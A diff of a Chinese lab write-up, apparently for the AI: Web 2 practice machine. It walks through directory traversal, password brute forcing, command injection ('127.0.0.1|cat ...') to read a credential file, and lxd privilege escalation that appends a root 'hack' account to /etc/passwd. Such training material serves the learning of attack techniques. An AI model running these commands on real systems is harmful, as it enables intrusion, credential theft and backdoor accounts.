@@ -7569,18 +7569,18 @@
 <p><img alt="image.png" src="../img/71Qx1CSUAZGVtU2w/1593400604810-913c4dba-311d-4ce5-be72-0ffabfdf1cd7-062163.png" /></p>
 <p>扫目录，扫出来一个 download.php，然后去试了试上面导航栏的名字，viewing.php 也可以访问，deleting.php 会跳转回来（可能是删完了跳回来了？）</p>
 <p><img alt="image.png" src="../img/71Qx1CSUAZGVtU2w/1593400782296-8017ea6d-6da4-4da3-bd56-b9b10eed291d-785875.png" /></p>
-<p><a href="https://www.exploit-db.com/exploits/40009">https://www.exploit-db.com/exploits/40009</a>
+<p><a href="https://www.exploit-db.com/exploits/40009">https://www.exploit-db.com/exploits/40009</a><br />
 这里有个目录遍历，使用 file_name 参数，看一下 apache 的认证文件</p>
 <p><img alt="image.png" src="../img/71Qx1CSUAZGVtU2w/1593401997082-176d8223-1280-4a08-b194-fe77812109a4-768880.png" /></p>
-<p>靶机介绍说用这个字典来爆破密码
+<p>靶机介绍说用这个字典来爆破密码<br />
 <a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou-45.txt">https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou-45.txt</a></p>
 <p>瞬间出结果 aiweb2admin：c.ronaldo</p>
 <p><img alt="image.png" src="../img/71Qx1CSUAZGVtU2w/1593402185829-ccf21e2a-a0c4-405c-95a4-c165c1efed8e-757671.png" /></p>
 <p>然后用 dirsearch 扫出来 webadmin（嗯，我以后还是直接用 dirsearch 把）</p>
 <p><img alt="image.png" src="../img/71Qx1CSUAZGVtU2w/1593402479803-01b4f6a4-cea5-47e5-90fe-fc7004bee06c-281724.png" /></p>
 <p>访问 <a href="http://192.168.149.178/webadmin/">http://192.168.149.178/webadmin/</a> 用刚刚爆破出来的密码登录进去</p>
-<p>又提示了 robots，去访问一下
-Disallow: /H05Tpin9555/
+<p>又提示了 robots，去访问一下<br />
+Disallow: /H05Tpin9555/<br />
 Disallow: /S0mextras/</p>
 <p>挨个访问，第一个有一个命令执行，用 | 可以绕过</p>
 <p><img alt="image.png" src="../img/71Qx1CSUAZGVtU2w/1593403136074-50b01cff-f136-4575-b79e-bc6694ec36ff-382701.png" /></p>
@@ -7588,19 +7588,19 @@ Disallow: /S0mextras/</p>
 <p><img alt="image.png" src="../img/71Qx1CSUAZGVtU2w/1593403275112-aaa4cbe5-e0dc-4a3e-bf40-fc52ad60ec45-358376.png" /></p>
 <p>127.0.0.1|cat /var/www/html/webadmin/S0mextras/.sshUserCred55512.txt 拿到 ssh 账号密码</p>
 <p><img alt="image.png" src="../img/71Qx1CSUAZGVtU2w/1593403335218-844afd13-1d85-4fc4-9959-c6843d818bc3-367322.png" /></p>
-<p>User: n0nr00tuser
+<p>User: n0nr00tuser<br />
 Cred: zxowieoi4sdsadpEClDws1sf</p>
 <p>ssh 连上看看</p>
 <p><img alt="image.png" src="../img/71Qx1CSUAZGVtU2w/1593403442503-4d76434f-392c-490f-b1f5-7a057b319efb-778185.png" /></p>
 <h2 id="_1">提权</h2>
-<p>用一下 <a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a> 试试，一直看一些 wp 用还没用过
+<p>用一下 <a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a> 试试，一直看一些 wp 用还没用过<br />
 直接 git clone <a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a> 然后进去给 LinEnum.sh 权限运行就可以</p>
 <p><img alt="image.png" src="../img/71Qx1CSUAZGVtU2w/1593409827518-40da822e-deac-4973-91b1-7d198bd4a330-135518.png" /></p>
 <p>当前用户 n0nr00tuser 是属于 lxd 的用户组成员</p>
 <blockquote>
-<p><strong>LXD和LXC</strong>
-Linux Container（LXC）通常被认为是一种轻量级虚拟化技术，它介于Chroot和完整开发的虚拟机之间，LXC可以创建一个跟正常Linux操作系统十分接近的环境，但是不需要使用到单独的内核资源
-Linux Daemon（LXD）是一个轻量级容器管理程序，而LXD是基于LXC容器技术实现的，而这种技术之前Docker也使用过。LXD使用了稳定的LXC API来完成所有的后台容器管理工作，并且增加了REST API支持，更进一步地提升了用户体验度
+<p><strong>LXD和LXC</strong><br />
+Linux Container（LXC）通常被认为是一种轻量级虚拟化技术，它介于Chroot和完整开发的虚拟机之间，LXC可以创建一个跟正常Linux操作系统十分接近的环境，但是不需要使用到单独的内核资源<br />
+Linux Daemon（LXD）是一个轻量级容器管理程序，而LXD是基于LXC容器技术实现的，而这种技术之前Docker也使用过。LXD使用了稳定的LXC API来完成所有的后台容器管理工作，并且增加了REST API支持，更进一步地提升了用户体验度<br />
 <a href="https://www.freebuf.com/articles/system/216803.html">https://www.freebuf.com/articles/system/216803.html</a></p>
 </blockquote>
 <p>依次执行这些语句</p>
@@ -7609,12 +7609,12 @@ lxc config set UbuntuMini security.privileged true
 lxc config set UbuntuMini security.nesting true
 lxc config device add UbuntuMini sharetesting disk source=/etc path=/sharingiscaring
 </code></pre>
-<p>然后，复制 /etc/passwd 到当前目录 passwd，然后把这一句加进去
-<code>echo 'hack:$1$hack$gP1TCDm4c1ABbBzR6fMid1:0:0::/root:/bin/bash' &gt;&gt; passwd</code>
-这里添加了一个有 root 权限的用户：hack，密码是：yichen
-可以用这条命令生成 hash
+<p>然后，复制 /etc/passwd 到当前目录 passwd，然后把这一句加进去<br />
+<code>echo 'hack:$1$hack$gP1TCDm4c1ABbBzR6fMid1:0:0::/root:/bin/bash' &gt;&gt; passwd</code><br />
+这里添加了一个有 root 权限的用户：hack，密码是：yichen<br />
+可以用这条命令生成 hash<br />
 <code>openssl passwd -1 -salt hack yichen</code></p>
-<p>然后把 passwd 传到容器里面
+<p>然后把 passwd 传到容器里面<br />
 <code>lxc file push passwd UbuntuMini/sharingiscaring/passwd</code></p>
 <p>如果显示没有权限可以用 <code>python -c "import pty;pty.spawn('/bin/bash')"</code> 开一个 bash 的 shell</p>
 <p><img alt="image.png" src="../img/71Qx1CSUAZGVtU2w/1593415357031-c6a3299e-086c-4f12-8fb5-702a4a4c82f0-805896.png" /></p>
